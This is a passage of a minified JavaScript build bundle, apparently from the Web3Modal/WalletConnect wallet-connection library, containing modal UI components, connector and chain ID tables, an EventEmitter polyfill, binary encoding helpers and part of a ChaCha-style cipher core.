    ></wui-icon-link>`}separatorTemplate(){return this.heading?pe`<wui-separator></wui-separator>`:null}getPadding(){return this.heading?["l","2l","l","2l"]:["l","2l","0","2l"]}async onViewChange(e){var t;const r=null==(t=this.shadowRoot)?void 0:t.querySelector("wui-text");if(r){const t=pE()[e];await r.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.heading=t,r.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"})}}async onHistoryChange(){var e;const{history:t}=Ft.state,r=null==(e=this.shadowRoot)?void 0:e.querySelector("#dynamic");t.length>1&&!this.showBack&&r?(await r.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.showBack=!0,r.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"})):t.length<=1&&this.showBack&&r&&(await r.animate([{opacity:1},{opacity:0}],{duration:200,fill:"forwards",easing:"ease"}).finished,this.showBack=!1,r.animate([{opacity:0},{opacity:1}],{duration:200,fill:"forwards",easing:"ease"}))}};kf.styles=[OW],Av([xt()],kf.prototype,"heading",void 0),Av([xt()],kf.prototype,"buffering",void 0),Av([xt()],kf.prototype,"showBack",void 0),kf=Av([De("w3m-header")],kf);var v9=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let u2=class extends $e{constructor(){super(...arguments),this.data=[]}render(){return pe`
      <wui-flex flexDirection="column" alignItems="center" gap="l">
        ${this.data.map((e=>pe`
            <wui-flex flexDirection="column" alignItems="center" gap="xl">
              <wui-flex flexDirection="row" justifyContent="center" gap="1xs">
                ${e.images.map((e=>pe`<wui-visual name=${e}></wui-visual>`))}
              </wui-flex>
            </wui-flex>
            <wui-flex flexDirection="column" alignItems="center" gap="xxs">
              <wui-text variant="paragraph-500" color="fg-100" align="center">
                ${e.title}
              </wui-text>
              <wui-text variant="small-500" color="fg-200" align="center">${e.text}</wui-text>
            </wui-flex>
          `))}
      </wui-flex>
    `}};v9([ve({type:Array})],u2.prototype,"data",void 0),u2=v9([De("w3m-help-widget")],u2);const PW=Qe`
  wui-flex {
    background-color: var(--wui-gray-glass-005);
  }

  a {
    text-decoration: none;
    color: var(--wui-color-fg-175);
    font-weight: 600;
  }
`;var MW=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let f2=class extends $e{render(){const{termsConditionsUrl:e,privacyPolicyUrl:t}=_r.state;return e||t?pe`
      <wui-flex .padding=${["m","s","s","s"]} justifyContent="center">
        <wui-text color="fg-250" variant="small-500" align="center">
          By connecting your wallet, you agree to our <br />
          ${this.termsTemplate()} ${this.andTemplate()} ${this.privacyTemplate()}
        </wui-text>
      </wui-flex>
    `:null}andTemplate(){const{termsConditionsUrl:e,privacyPolicyUrl:t}=_r.state;return e&&t?"and":""}termsTemplate(){const{termsConditionsUrl:e}=_r.state;return e?pe`<a href=${e}>Terms of Service</a>`:null}privacyTemplate(){const{privacyPolicyUrl:e}=_r.state;return e?pe`<a href=${e}>Privacy Policy</a>`:null}};f2.styles=[PW],f2=MW([De("w3m-legal-footer")],f2);const kW=Qe`
  :host {
    display: block;
    padding: 0 var(--wui-spacing-xl) var(--wui-spacing-xl);
  }
`;var m9=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};let Pg=class extends $e{constructor(){super(...arguments),this.wallet=void 0}render(){if(!this.wallet)return this.style.display="none",null;const{name:e,app_store:t,play_store:r,chrome_store:n,homepage:i}=this.wallet,o=pt.isMobile(),s=pt.isIos(),a=pt.isAndroid(),c=[t,r,i,n].filter(Boolean).length>1,l=Mr.getTruncateString({string:e,charsStart:12,charsEnd:0,truncate:"end"});return c&&!o?pe`
        <wui-cta-button
          label=${`Don't have ${l}?`}
          buttonLabel="Get"
          @click=${()=>Ft.push("Downloads",{wallet:this.wallet})}
        ></wui-cta-button>
      `:!c&&i?pe`
        <wui-cta-button
          label=${`Don't have ${l}?`}
          buttonLabel="Get"
          @click=${this.onHomePage.bind(this)}
        ></wui-cta-button>
      `:t&&s?pe`
        <wui-cta-button
          label=${`Don't have ${l}?`}
          buttonLabel="Get"
          @click=${this.onAppStore.bind(this)}
        ></wui-cta-button>
      `:r&&a?pe`
        <wui-cta-button
          label=${`Don't have ${l}?`}
          buttonLabel="Get"
          @click=${this.onPlayStore.bind(this)}
        ></wui-cta-button>
      `:(this.style.display="none",null)}onAppStore(){var e;null!=(e=this.wallet)&&e.app_store&&pt.openHref(this.wallet.app_store,"_blank")}onPlayStore(){var e;null!=(e=this.wallet)&&e.play_store&&pt.openHref(this.wallet.play_store,"_blank")}onHomePage(){var e;null!=(e=this.wallet)&&e.homepage&&pt.openHref(this.wallet.homepage,"_blank")}};Pg.styles=[kW],m9([ve({type:Object})],Pg.prototype,"wallet",void 0),Pg=m9([De("w3m-mobile-download-links")],Pg);const DW=Qe`
  :host {
    display: block;
    position: absolute;
    opacity: 0;
    pointer-events: none;
    top: 11px;
    left: 50%;
  }
`;var b9=globalThis&&globalThis.__decorate||function(e,t,r,n){var i,o=arguments.length,s=o<3?t:null===n?n=Object.getOwnPropertyDescriptor(t,r):n;if("object"==typeof Reflect&&"function"==typeof Reflect.decorate)s=Reflect.decorate(e,t,r,n);else for(var a=e.length-1;a>=0;a--)(i=e[a])&&(s=(o<3?i(s):o>3?i(t,r,s):i(t,r))||s);return o>3&&s&&Object.defineProperty(t,r,s),s};const $W={success:{backgroundColor:"success-100",iconColor:"success-100",icon:"checkmark"},error:{backgroundColor:"error-100",iconColor:"error-100",icon:"close"}};let Mg=class extends $e{constructor(){super(),this.unsubscribe=[],this.timeout=void 0,this.open=po.state.open,this.unsubscribe.push(po.subscribeKey("open",(e=>{this.open=e,this.onOpen()})))}disconnectedCallback(){clearTimeout(this.timeout),this.unsubscribe.forEach((e=>e()))}render(){const{message:e,variant:t}=po.state,r=$W[t];return pe`
      <wui-snackbar
        message=${e}
        backgroundColor=${r.backgroundColor}
        iconColor=${r.iconColor}
        icon=${r.icon}
      ></wui-snackbar>
    `}onOpen(){clearTimeout(this.timeout),this.open?(this.animate([{opacity:0,transform:"translateX(-50%) scale(0.85)"},{opacity:1,transform:"translateX(-50%) scale(1)"}],{duration:150,fill:"forwards",easing:"ease"}),this.timeout=setTimeout((()=>po.hide()),2500)):this.animate([{opacity:1,transform:"translateX(-50%) scale(1)"},{opacity:0,transform:"translateX(-50%) scale(0.85)"}],{duration:150,fill:"forwards",easing:"ease"})}};Mg.styles=DW,b9([xt()],Mg.prototype,"open",void 0),Mg=b9([De("w3m-snackbar")],Mg);const LW="modulepreload",BW=function(e){return"/"+e},gE={},h2=function(e,t,r){if(!t||0===t.length)return e();const n=document.getElementsByTagName("link");return Promise.all(t.map((e=>{if((e=BW(e))in gE)return;gE[e]=!0;const t=e.endsWith(".css"),i=t?'[rel="stylesheet"]':"";if(r)for(let r=n.length-1;r>=0;r--){const i=n[r];if(i.href===e&&(!t||"stylesheet"===i.rel))return}else if(document.querySelector(`link[href="${e}"]${i}`))return;const o=document.createElement("link");return o.rel=t?"stylesheet":LW,t||(o.as="script",o.crossOrigin=""),o.href=e,document.head.appendChild(o),t?new Promise(((t,r)=>{o.addEventListener("load",t),o.addEventListener("error",(()=>r(new Error(`Unable to preload CSS for ${e}`))))})):void 0}))).then((()=>e())).catch((e=>{const t=new Event("vite:preloadError",{cancelable:!0});if(t.payload=e,window.dispatchEvent(t),!t.defaultPrevented)throw e}))};let vE=!1;class FW{constructor(e){this.initPromise=void 0,this.setIsConnected=e=>{Rr.setIsConnected(e)},this.setCaipAddress=e=>{Rr.setCaipAddress(e)},this.setBalance=(e,t)=>{Rr.setBalance(e,t)},this.setProfileName=e=>{Rr.setProfileName(e)},this.setProfileImage=e=>{Rr.setProfileImage(e)},this.resetAccount=()=>{Rr.resetAccount()},this.setCaipNetwork=e=>{Fr.setCaipNetwork(e)},this.getCaipNetwork=()=>Fr.state.caipNetwork,this.setRequestedCaipNetworks=e=>{Fr.setRequestedCaipNetworks(e)},this.getApprovedCaipNetworksData=()=>Fr.getApprovedCaipNetworksData(),this.resetNetwork=()=>{Fr.resetNetwork()},this.setConnectors=e=>{ks.setConnectors(e)},this.addConnector=e=>{ks.addConnector(e)},this.getConnectors=()=>ks.getConnectors(),this.resetWcConnection=()=>{vr.resetWcConnection()},this.fetchIdentity=e=>AB.fetchIdentity(e),this.setAddressExplorerUrl=e=>{Rr.setAddressExplorerUrl(e)},this.initControllers(e),this.initOrContinue()}async open(e){await this.initOrContinue(),On.open(e)}async close(){await this.initOrContinue(),On.close()}getThemeMode(){return Ts.state.themeMode}getThemeVariables(){return Ts.state.themeVariables}setThemeMode(e){Ts.setThemeMode(e),NA(Ts.state.themeMode)}setThemeVariables(e){Ts.setThemeVariables(e),qB(Ts.state.themeVariables)}subscribeTheme(e){return Ts.subscribe(e)}getState(){return{...yf.state}}subscribeState(e){return yf.subscribe(e)}getEvent(){return{...kr.state}}subscribeEvents(e){return kr.subscribe(e)}initControllers(e){Fr.setClient(e.networkControllerClient),Fr.setDefaultCaipNetwork(e.defaultChain),_r.setProjectId(e.projectId),_r.setIncludeWalletIds(e.includeWalletIds),_r.setExcludeWalletIds(e.excludeWalletIds),_r.setFeaturedWalletIds(e.featuredWalletIds),_r.setTokens(e.tokens),_r.setTermsConditionsUrl(e.termsConditionsUrl),_r.setPrivacyPolicyUrl(e.privacyPolicyUrl),_r.setCustomWallets(e.customWallets),_r.setEnableAnalytics(e.enableAnalytics),_r.setSdkVersion(e._sdkVersion),vr.setClient(e.connectionControllerClient),e.metadata&&_r.setMetadata(e.metadata),e.themeMode&&Ts.setThemeMode(e.themeMode),e.themeVariables&&Ts.setThemeVariables(e.themeVariables)}async initOrContinue(){return!this.initPromise&&!vE&&pt.isClient()&&(vE=!0,this.initPromise=new Promise((async e=>{await Promise.all([h2((()=>Promise.resolve().then((()=>sW))),void 0)]);const t=document.createElement("w3m-modal");document.body.insertAdjacentElement("beforeend",t),e()}))),this.initPromise}}const qe={WALLET_CONNECT_CONNECTOR_ID:"walletConnect",INJECTED_CONNECTOR_ID:"injected",COINBASE_CONNECTOR_ID:"coinbaseWallet",SAFE_CONNECTOR_ID:"safe",LEDGER_CONNECTOR_ID:"ledger",EIP6963_CONNECTOR_ID:"eip6963",EIP155:"eip155",ADD_CHAIN_METHOD:"wallet_addEthereumChain",EIP6963_ANNOUNCE_EVENT:"eip6963:announceProvider",EIP6963_REQUEST_EVENT:"eip6963:requestProvider",VERSION:"3.2.1"},Ln={ConnectorExplorerIds:{[qe.COINBASE_CONNECTOR_ID]:"fd20dc426fb37566d803205b19bbc1d4096b248ac04548e3cfb6b3a38bd033aa",[qe.SAFE_CONNECTOR_ID]:"225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f",[qe.LEDGER_CONNECTOR_ID]:"19177a98252e07ddfc9af2083ba8e07ef627cb6103467ffebb3f8f4205fd7927"},EIP155NetworkImageIds:{1:"692ed6ba-e569-459a-556a-776476829e00",42161:"600a9a04-c1b9-42ca-6785-9b4b6ff85200",43114:"30c46e53-e989-45fb-4549-be3bd4eb3b00",56:"93564157-2e8e-4ce7-81df-b264dbee9b00",250:"06b26297-fe0c-4733-5d6b-ffa5498aac00",10:"ab9c186a-c52f-464b-2906-ca59d760a400",137:"41d04d42-da3b-4453-8506-668cc0727900",100:"02b53f6a-e3d4-479e-1cb4-21178987d100",9001:"f926ff41-260d-4028-635e-91913fc28e00",324:"b310f07f-4ef7-49f3-7073-2a0a39685800",314:"5a73b3dd-af74-424e-cae0-0de859ee9400",4689:"34e68754-e536-40da-c153-6ef2e7188a00",1088:"3897a66d-40b9-4833-162f-a2c90531c900",1284:"161038da-44ae-4ec7-1208-0ea569454b00",1285:"f1d73bb6-5450-4e18-38f7-fb6484264a00",7777777:"845c60df-d429-4991-e687-91ae45791600",42220:"ab781bbc-ccc6-418d-d32d-789b15da1f00",8453:"7289c336-3981-4081-c5f4-efc26ac64a00",1313161554:"3ff73439-a619-4894-9262-4470c773a100"},ConnectorImageIds:{[qe.COINBASE_CONNECTOR_ID]:"0c2840c3-5b04-4c44-9661-fbd4b49e1800",[qe.SAFE_CONNECTOR_ID]:"461db637-8616-43ce-035a-d89b8a1d5800",[qe.LEDGER_CONNECTOR_ID]:"54a1aa77-d202-4f8d-0fb2-5d2bb6db0300",[qe.WALLET_CONNECT_CONNECTOR_ID]:"ef1a1fcf-7fe8-4d69-bd6d-fda1345b4400",[qe.INJECTED_CONNECTOR_ID]:"07ba87ed-43aa-4adf-4540-9e6a2b9cae00"},ConnectorNamesMap:{[qe.INJECTED_CONNECTOR_ID]:"Browser Wallet",[qe.WALLET_CONNECT_CONNECTOR_ID]:"WalletConnect",[qe.COINBASE_CONNECTOR_ID]:"Coinbase",[qe.LEDGER_CONNECTOR_ID]:"Ledger",[qe.SAFE_CONNECTOR_ID]:"Safe"},ConnectorTypesMap:{[qe.INJECTED_CONNECTOR_ID]:"INJECTED",[qe.WALLET_CONNECT_CONNECTOR_ID]:"WALLET_CONNECT",[qe.EIP6963_CONNECTOR_ID]:"ANNOUNCED"}},b1={caipNetworkIdToNumber:e=>e?Number(e.split(":")[1]):void 0,getCaipTokens(e){if(!e)return;const t={};return Object.entries(e).forEach((([e,r])=>{t[`${qe.EIP155}:${e}`]=r})),t}};var G1,j3={exports:{}},of="object"==typeof Reflect?Reflect:null,mE=of&&"function"==typeof of.apply?of.apply:function(e,t,r){return Function.prototype.apply.call(e,t,r)};function jW(e){console&&console.warn&&console.warn(e)}G1=of&&"function"==typeof of.ownKeys?of.ownKeys:Object.getOwnPropertySymbols?function(e){return Object.getOwnPropertyNames(e).concat(Object.getOwnPropertySymbols(e))}:function(e){return Object.getOwnPropertyNames(e)};var w9=Number.isNaN||function(e){return e!=e};function Er(){Er.init.call(this)}j3.exports=Er,j3.exports.once=HW,Er.EventEmitter=Er,Er.prototype._events=void 0,Er.prototype._eventsCount=0,Er.prototype._maxListeners=void 0;var bE=10;function Iv(e){if("function"!=typeof e)throw new TypeError('The "listener" argument must be of type Function. Received type '+typeof e)}function y9(e){return void 0===e._maxListeners?Er.defaultMaxListeners:e._maxListeners}function _9(e,t,r,n){var i,o,s;if(Iv(r),void 0===(o=e._events)?(o=e._events=Object.create(null),e._eventsCount=0):(void 0!==o.newListener&&(e.emit("newListener",t,r.listener?r.listener:r),o=e._events),s=o[t]),void 0===s)s=o[t]=r,++e._eventsCount;else if("function"==typeof s?s=o[t]=n?[r,s]:[s,r]:n?s.unshift(r):s.push(r),(i=y9(e))>0&&s.length>i&&!s.warned){s.warned=!0;var a=new Error("Possible EventEmitter memory leak detected. "+s.length+" "+String(t)+" listeners added. Use emitter.setMaxListeners() to increase limit");a.name="MaxListenersExceededWarning",a.emitter=e,a.type=t,a.count=s.length,jW(a)}return e}function UW(){if(!this.fired)return this.target.removeListener(this.type,this.wrapFn),this.fired=!0,0===arguments.length?this.listener.call(this.target):this.listener.apply(this.target,arguments)}function E9(e,t,r){var n={fired:!1,wrapFn:void 0,target:e,type:t,listener:r},i=UW.bind(n);return i.listener=r,n.wrapFn=i,i}function x9(e,t,r){var n=e._events;if(void 0===n)return[];var i=n[t];return void 0===i?[]:"function"==typeof i?r?[i.listener||i]:[i]:r?zW(i):C9(i,i.length)}function S9(e){var t=this._events;if(void 0!==t){var r=t[e];if("function"==typeof r)return 1;if(void 0!==r)return r.length}return 0}function C9(e,t){for(var r=new Array(t),n=0;n<t;++n)r[n]=e[n];return r}function WW(e,t){for(;t+1<e.length;t++)e[t]=e[t+1];e.pop()}function zW(e){for(var t=new Array(e.length),r=0;r<t.length;++r)t[r]=e[r].listener||e[r];return t}function HW(e,t){return new Promise((function(r,n){function i(r){e.removeListener(t,o),n(r)}function o(){"function"==typeof e.removeListener&&e.removeListener("error",i),r([].slice.call(arguments))}A9(e,t,o,{once:!0}),"error"!==t&&qW(e,i,{once:!0})}))}function qW(e,t,r){"function"==typeof e.on&&A9(e,"error",t,r)}function A9(e,t,r,n){if("function"==typeof e.on)n.once?e.once(t,r):e.on(t,r);else{if("function"!=typeof e.addEventListener)throw new TypeError('The "emitter" argument must be of type EventEmitter. Received type '+typeof e);e.addEventListener(t,(function i(o){n.once&&e.removeEventListener(t,i),r(o)}))}}Object.defineProperty(Er,"defaultMaxListeners",{enumerable:!0,get:function(){return bE},set:function(e){if("number"!=typeof e||e<0||w9(e))throw new RangeError('The value of "defaultMaxListeners" is out of range. It must be a non-negative number. Received '+e+".");bE=e}}),Er.init=function(){(void 0===this._events||this._events===Object.getPrototypeOf(this)._events)&&(this._events=Object.create(null),this._eventsCount=0),this._maxListeners=this._maxListeners||void 0},Er.prototype.setMaxListeners=function(e){if("number"!=typeof e||e<0||w9(e))throw new RangeError('The value of "n" is out of range. It must be a non-negative number. Received '+e+".");return this._maxListeners=e,this},Er.prototype.getMaxListeners=function(){return y9(this)},Er.prototype.emit=function(e){for(var t=[],r=1;r<arguments.length;r++)t.push(arguments[r]);var n="error"===e,i=this._events;if(void 0!==i)n=n&&void 0===i.error;else if(!n)return!1;if(n){var o;if(t.length>0&&(o=t[0]),o instanceof Error)throw o;var s=new Error("Unhandled error."+(o?" ("+o.message+")":""));throw s.context=o,s}var a=i[e];if(void 0===a)return!1;if("function"==typeof a)mE(a,this,t);else{var c=a.length,l=C9(a,c);for(r=0;r<c;++r)mE(l[r],this,t)}return!0},Er.prototype.addListener=function(e,t){return _9(this,e,t,!1)},Er.prototype.on=Er.prototype.addListener,Er.prototype.prependListener=function(e,t){return _9(this,e,t,!0)},Er.prototype.once=function(e,t){return Iv(t),this.on(e,E9(this,e,t)),this},Er.prototype.prependOnceListener=function(e,t){return Iv(t),this.prependListener(e,E9(this,e,t)),this},Er.prototype.removeListener=function(e,t){var r,n,i,o,s;if(Iv(t),void 0===(n=this._events))return this;if(void 0===(r=n[e]))return this;if(r===t||r.listener===t)0==--this._eventsCount?this._events=Object.create(null):(delete n[e],n.removeListener&&this.emit("removeListener",e,r.listener||t));else if("function"!=typeof r){for(i=-1,o=r.length-1;o>=0;o--)if(r[o]===t||r[o].listener===t){s=r[o].listener,i=o;break}if(i<0)return this;0===i?r.shift():WW(r,i),1===r.length&&(n[e]=r[0]),void 0!==n.removeListener&&this.emit("removeListener",e,s||t)}return this},Er.prototype.off=Er.prototype.removeListener,Er.prototype.removeAllListeners=function(e){var t,r,n;if(void 0===(r=this._events))return this;if(void 0===r.removeListener)return 0===arguments.length?(this._events=Object.create(null),this._eventsCount=0):void 0!==r[e]&&(0==--this._eventsCount?this._events=Object.create(null):delete r[e]),this;if(0===arguments.length){var i,o=Object.keys(r);for(n=0;n<o.length;++n)"removeListener"!==(i=o[n])&&this.removeAllListeners(i);return this.removeAllListeners("removeListener"),this._events=Object.create(null),this._eventsCount=0,this}if("function"==typeof(t=r[e]))this.removeListener(e,t);else if(void 0!==t)for(n=t.length-1;n>=0;n--)this.removeListener(e,t[n]);return this},Er.prototype.listeners=function(e){return x9(this,e,!0)},Er.prototype.rawListeners=function(e){return x9(this,e,!1)},Er.listenerCount=function(e,t){return"function"==typeof e.listenerCount?e.listenerCount(t):S9.call(e,t)},Er.prototype.listenerCount=S9,Er.prototype.eventNames=function(){return this._eventsCount>0?G1(this._events):[]};var ai=j3.exports;const U3=tu(ai);var W3={},Rv={},Dt={},I9={};!function(e){Object.defineProperty(e,"__esModule",{value:!0}),e.mul=Math.imul||function(e,t){var r=65535&e,n=65535&t;return r*n+((e>>>16&65535)*n+r*(t>>>16&65535)<<16>>>0)|0},e.add=function(e,t){return e+t|0},e.sub=function(e,t){return e-t|0},e.rotl=function(e,t){return e<<t|e>>>32-t},e.rotr=function(e,t){return e<<32-t|e>>>t},e.isInteger=Number.isInteger||function(e){return"number"==typeof e&&isFinite(e)&&Math.floor(e)===e},e.MAX_SAFE_INTEGER=9007199254740991,e.isSafeInteger=function(t){return e.isInteger(t)&&t>=-e.MAX_SAFE_INTEGER&&t<=e.MAX_SAFE_INTEGER}}(I9),Object.defineProperty(Dt,"__esModule",{value:!0});var R9=I9;function VW(e,t){return void 0===t&&(t=0),(e[t+0]<<8|e[t+1])<<16>>16}function GW(e,t){return void 0===t&&(t=0),(e[t+0]<<8|e[t+1])>>>0}function KW(e,t){return void 0===t&&(t=0),(e[t+1]<<8|e[t])<<16>>16}function JW(e,t){return void 0===t&&(t=0),(e[t+1]<<8|e[t])>>>0}function T9(e,t,r){return void 0===t&&(t=new Uint8Array(2)),void 0===r&&(r=0),t[r+0]=e>>>8,t[r+1]=e>>>0,t}function N9(e,t,r){return void 0===t&&(t=new Uint8Array(2)),void 0===r&&(r=0),t[r+0]=e>>>0,t[r+1]=e>>>8,t}function d2(e,t){return void 0===t&&(t=0),e[t]<<24|e[t+1]<<16|e[t+2]<<8|e[t+3]}function p2(e,t){return void 0===t&&(t=0),(e[t]<<24|e[t+1]<<16|e[t+2]<<8|e[t+3])>>>0}function g2(e,t){return void 0===t&&(t=0),e[t+3]<<24|e[t+2]<<16|e[t+1]<<8|e[t]}function v2(e,t){return void 0===t&&(t=0),(e[t+3]<<24|e[t+2]<<16|e[t+1]<<8|e[t])>>>0}function kg(e,t,r){return void 0===t&&(t=new Uint8Array(4)),void 0===r&&(r=0),t[r+0]=e>>>24,t[r+1]=e>>>16,t[r+2]=e>>>8,t[r+3]=e>>>0,t}function Dg(e,t,r){return void 0===t&&(t=new Uint8Array(4)),void 0===r&&(r=0),t[r+0]=e>>>0,t[r+1]=e>>>8,t[r+2]=e>>>16,t[r+3]=e>>>24,t}function ZW(e,t){void 0===t&&(t=0);var r=d2(e,t),n=d2(e,t+4);return 4294967296*r+n-4294967296*(n>>31)}function QW(e,t){return void 0===t&&(t=0),4294967296*p2(e,t)+p2(e,t+4)}function YW(e,t){void 0===t&&(t=0);var r=g2(e,t);return 4294967296*g2(e,t+4)+r-4294967296*(r>>31)}function XW(e,t){void 0===t&&(t=0);var r=v2(e,t);return 4294967296*v2(e,t+4)+r}function O9(e,t,r){return void 0===t&&(t=new Uint8Array(8)),void 0===r&&(r=0),kg(e/4294967296>>>0,t,r),kg(e>>>0,t,r+4),t}function P9(e,t,r){return void 0===t&&(t=new Uint8Array(8)),void 0===r&&(r=0),Dg(e>>>0,t,r),Dg(e/4294967296>>>0,t,r+4),t}function ez(e,t,r){if(void 0===r&&(r=0),e%8!=0)throw new Error("readUintBE supports only bitLengths divisible by 8");if(e/8>t.length-r)throw new Error("readUintBE: array is too short for the given bitLength");for(var n=0,i=1,o=e/8+r-1;o>=r;o--)n+=t[o]*i,i*=256;return n}function tz(e,t,r){if(void 0===r&&(r=0),e%8!=0)throw new Error("readUintLE supports only bitLengths divisible by 8");if(e/8>t.length-r)throw new Error("readUintLE: array is too short for the given bitLength");for(var n=0,i=1,o=r;o<r+e/8;o++)n+=t[o]*i,i*=256;return n}function rz(e,t,r,n){if(void 0===r&&(r=new Uint8Array(e/8)),void 0===n&&(n=0),e%8!=0)throw new Error("writeUintBE supports only bitLengths divisible by 8");if(!R9.isSafeInteger(t))throw new Error("writeUintBE value must be an integer");for(var i=1,o=e/8+n-1;o>=n;o--)r[o]=t/i&255,i*=256;return r}function nz(e,t,r,n){if(void 0===r&&(r=new Uint8Array(e/8)),void 0===n&&(n=0),e%8!=0)throw new Error("writeUintLE supports only bitLengths divisible by 8");if(!R9.isSafeInteger(t))throw new Error("writeUintLE value must be an integer");for(var i=1,o=n;o<n+e/8;o++)r[o]=t/i&255,i*=256;return r}function iz(e,t){return void 0===t&&(t=0),new DataView(e.buffer,e.byteOffset,e.byteLength).getFloat32(t)}function sz(e,t){return void 0===t&&(t=0),new DataView(e.buffer,e.byteOffset,e.byteLength).getFloat32(t,!0)}function oz(e,t){return void 0===t&&(t=0),new DataView(e.buffer,e.byteOffset,e.byteLength).getFloat64(t)}function az(e,t){return void 0===t&&(t=0),new DataView(e.buffer,e.byteOffset,e.byteLength).getFloat64(t,!0)}function cz(e,t,r){return void 0===t&&(t=new Uint8Array(4)),void 0===r&&(r=0),new DataView(t.buffer,t.byteOffset,t.byteLength).setFloat32(r,e),t}function lz(e,t,r){return void 0===t&&(t=new Uint8Array(4)),void 0===r&&(r=0),new DataView(t.buffer,t.byteOffset,t.byteLength).setFloat32(r,e,!0),t}function uz(e,t,r){return void 0===t&&(t=new Uint8Array(8)),void 0===r&&(r=0),new DataView(t.buffer,t.byteOffset,t.byteLength).setFloat64(r,e),t}function fz(e,t,r){return void 0===t&&(t=new Uint8Array(8)),void 0===r&&(r=0),new DataView(t.buffer,t.byteOffset,t.byteLength).setFloat64(r,e,!0),t}Dt.readInt16BE=VW,Dt.readUint16BE=GW,Dt.readInt16LE=KW,Dt.readUint16LE=JW,Dt.writeUint16BE=T9,Dt.writeInt16BE=T9,Dt.writeUint16LE=N9,Dt.writeInt16LE=N9,Dt.readInt32BE=d2,Dt.readUint32BE=p2,Dt.readInt32LE=g2,Dt.readUint32LE=v2,Dt.writeUint32BE=kg,Dt.writeInt32BE=kg,Dt.writeUint32LE=Dg,Dt.writeInt32LE=Dg,Dt.readInt64BE=ZW,Dt.readUint64BE=QW,Dt.readInt64LE=YW,Dt.readUint64LE=XW,Dt.writeUint64BE=O9,Dt.writeInt64BE=O9,Dt.writeUint64LE=P9,Dt.writeInt64LE=P9,Dt.readUintBE=ez,Dt.readUintLE=tz,Dt.writeUintBE=rz,Dt.writeUintLE=nz,Dt.readFloat32BE=iz,Dt.readFloat32LE=sz,Dt.readFloat64BE=oz,Dt.readFloat64LE=az,Dt.writeFloat32BE=cz,Dt.writeFloat32LE=lz,Dt.writeFloat64BE=uz,Dt.writeFloat64LE=fz;var fs={};function hz(e){for(var t=0;t<e.length;t++)e[t]=0;return e}Object.defineProperty(fs,"__esModule",{value:!0}),fs.wipe=hz,Object.defineProperty(Rv,"__esModule",{value:!0});var Xn=Dt,m2=fs,dz=20;function pz(e,t,r){for(var n=1634760805,i=857760878,o=2036477234,s=1797285236,a=r[3]<<24|r[2]<<16|r[1]<<8|r[0],c=r[7]<<24|r[6]<<16|r[5]<<8|r[4],l=r[11]<<24|r[10]<<16|r[9]<<8|r[8],u=r[15]<<24|r[14]<<16|r[13]<<8|r[12],h=r[19]<<24|r[18]<<16|r[17]<<8|r[16],d=r[23]<<24|r[22]<<16|r[21]<<8|r[20],f=r[27]<<24|r[26]<<16|r[25]<<8|r[24],p=r[31]<<24|r[30]<<16|r[29]<<8|r[28],g=t[3]<<24|t[2]<<16|t[1]<<8|t[0],m=t[7]<<24|t[6]<<16|t[5]<<8|t[4],v=t[11]<<24|t[10]<<16|t[9]<<8|t[8],y=t[15]<<24|t[14]<<16|t[13]<<8|t[12],b=n,w=i,_=o,E=s,x=a,S=c,A=l,C=u,I=h,k=d,N=f,R=p,T=g,O=m,P=v,M=y,j=0;j<dz;j+=2)x=(x^=I=I+(T=(T^=b=b+x|0)>>>16|T<<16)|0)>>>20|x<<12,S=(S^=k=k+(O=(O^=w=w+S|0)>>>16|O<<16)|0)>>>20|S<<12,A=(A^=N=N+(P=(P^=_=_+A|0)>>>16|P<<16)|0)>>>20|A<<12,C=(C^=R=R+(M=(M^=E=E+C|0)>>>16|M<<16)|0)>>>20|C<<12,A=(A^=N=N+(P=(P^=_=_+A|0)>>>24|P<<8)|0)>>>25|A<<7,C=(C^=R=R+(M=(M^=E=E+C|0)>>>24|M<<8)|0)>>>25|C<<7,S=(S^=k=k+(O=(O^=w=w+S|0)>>>24|O<<8)|0)>>>25|S<<7,x=(x^=I=I+(T=(T^=b=b+x|0)>>>24|T<<8)|0)>>>25|x<<7,S=(S^=N=N+(M=(M^=b=b+S|0)>>>16|M<<16)|0)>>>20|S<<12,A=(A^=R=R+(T=(T^=w=w+A|0)>>>16|T<<16)|0)>>>20|A<<12,C=(C^=I=I+(O=(O^=_=_+C|0)>>>16|O<<16)|0)>>>20|C<<12,x=(x^=k=k+(P=(P^=E=E+x|0)>>>16|P<<16)|0)>>>20|x<<12,C=(C^=I=I+(O=(O^=_=_+C|0)>>>24|O<<8)|0)>>>25|C<<7,x=(x^=k=k+(P=(P^=E=E+x|0)>>>24|P<<8)|0)>>>25|x<<7,A=(A^=R=R+(T=(T^=w=w+A|0)>>>24|T<<8)|0)>>>25|A<<7,S=(S^=N=N+(M=(M^=b=b+S|0)>>>24|M<<8)|0)>>>25|S<<7;Xn.writeUint32LE(b+n|0,e,0),Xn.writeUint32LE(w+i|0,e,4),Xn.writeUint32LE(_+o|0,e,8),Xn.writeUint32LE(E+s|0,e,12),Xn.writeUint32LE(x+a|0,e,16),Xn.writeUint32LE(S+c|0,e,20),Xn.writeUint32LE(A+l|0,e,24),Xn.wri